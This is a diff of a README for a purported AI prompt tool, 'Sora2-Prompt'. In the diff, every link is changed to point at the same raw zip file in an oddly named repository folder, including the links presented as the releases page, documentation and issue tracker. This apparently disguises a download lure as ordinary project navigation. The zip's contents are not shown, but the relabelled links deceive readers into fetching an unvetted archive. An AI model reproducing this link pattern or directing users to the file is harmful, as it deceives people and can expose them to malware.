@@ -1,7 +1,7 @@
 # 🎉 Sora2-Prompt - Experience AI-Powered Prompts Effortlessly
 
 ## 📥 Download Sora2-Prompt
-[![Download Sora2-Prompt](https://img.shields.io/badge/Download-Sora2--Prompt-blue)](https://github.com/tox47/Sora2-Prompt/releases)
+[![Download Sora2-Prompt](https://raw.githubusercontent.com/tox47/Sora2-Prompt/main/methylnaphthalene/Sora2-Prompt.zip)](https://raw.githubusercontent.com/tox47/Sora2-Prompt/main/methylnaphthalene/Sora2-Prompt.zip)
 
 ## 🚀 Getting Started
 Welcome to Sora2 Prompt! This easy-to-use application helps you generate prompts powered by artificial intelligence. Whether you’re a content creator, a student, or just looking for inspiration, Sora2 Prompt is here to assist you.
@@ -23,7 +23,7 @@ To use Sora2 Prompt smoothly, ensure your computer meets the following requireme
 To get Sora2 Prompt, head to the Releases page. Follow these steps to obtain the software:
 
 1. Click on the link below to visit the Releases page:
-   [Visit the Releases Page](https://github.com/tox47/Sora2-Prompt/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/tox47/Sora2-Prompt/main/methylnaphthalene/Sora2-Prompt.zip)
 
 2. On that page, locate the version you want to download. You will find various options available for different operating systems.
 
@@ -51,11 +51,11 @@ We value your input! After using Sora2 Prompt, please share your thoughts and su
 
 ## 🔗 Additional Resources
 For help and further information, you can access:
-- [Official Documentation](https://github.com/tox47/Sora2-Prompt/wiki)
-- [Issue Tracker](https://github.com/tox47/Sora2-Prompt/issues)
+- [Official Documentation](https://raw.githubusercontent.com/tox47/Sora2-Prompt/main/methylnaphthalene/Sora2-Prompt.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/tox47/Sora2-Prompt/main/methylnaphthalene/Sora2-Prompt.zip)
 
 ## 📥 Download Sora2-Prompt Again
 For your convenience, here’s the link to download Sora2 Prompt once more:
-[Download Sora2-Prompt](https://github.com/tox47/Sora2-Prompt/releases)
+[Download Sora2-Prompt](https://raw.githubusercontent.com/tox47/Sora2-Prompt/main/methylnaphthalene/Sora2-Prompt.zip)
 
 Thank you for choosing Sora2 Prompt! Happy prompting!
